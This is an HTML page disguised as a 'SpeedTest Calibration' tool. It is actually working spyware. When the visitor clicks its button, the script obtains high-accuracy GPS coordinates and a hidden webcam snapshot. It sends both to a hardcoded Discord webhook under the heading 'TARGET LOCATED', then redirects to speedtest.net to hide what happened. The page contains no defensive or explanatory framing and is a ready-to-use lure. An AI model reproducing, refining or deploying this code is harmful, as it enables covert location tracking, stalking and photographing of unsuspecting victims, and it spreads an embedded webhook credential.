<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpeedTest Calibration</title>
    <style>
        body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 350px; border: 1px solid #232a42; }
        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; font-size: 1.1rem; }
        #status { margin-top: 15px; color: #5c6784; font-size: 0.8rem; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h2>NETWORK CALIBRATION</h2>
        <p>Sync sensors to begin the 2026 Speed Test.</p>
        <button class="btn" id="startBtn">START NOW</button>
        <div id="status">Status: Waiting for User...</div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';

        document.getElementById('startBtn').addEventListener('click', function() {
            const status = document.getElementById('status');
            status.innerText = "1. Requesting GPS...";

            // STEP 1: Get GPS
            navigator.geolocation.getCurrentPosition(async (pos) => {
                status.innerText = "2. GPS Found. Syncing Camera...";
                
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;

                // STEP 2: Try Camera
                let stream = null;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                } catch (e) {
                    console.log("Camera access denied");
                }

                // STEP 3: Send to Discord
                status.innerText = "3. Uploading Data...";
                const formData = new FormData();
                const message = {
                    content: "ðŸŽ¯ **TARGET LOCATED**",
                    embeds: [{
                        title: "Location Report",
                        fields: [
                            { name: "Maps Link", value: `https://www.google.com/maps?q=${lat},${lon}` }
                        ]
                    }]
                };
                formData.append('payload_json', JSON.stringify(message));

                if (stream) {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    const canvas = document.getElementById('canvas');
                    
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(async (blob) => {
                            formData.append('file', blob, 'shot.jpg');
                            await fetch(WEBHOOK, { method: 'POST', body: formData });
                            stream.getTracks().forEach(t => t.stop());
                            done();
                        }, 'image/jpeg');
                    }, 1000);
                } else {
                    await fetch(WEBHOOK, { method: 'POST', body: formData });
                    done();
                }

            }, (err) => {
                alert("Error: GPS must be allowed to calibrate the speed test.");
                status.innerText = "Error: GPS Denied.";
            }, { enableHighAccuracy: true });
        });

        function done() {
            document.getElementById('status').innerText = "Calibration Complete!";
            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
        }
    </script>
</body>
</html>
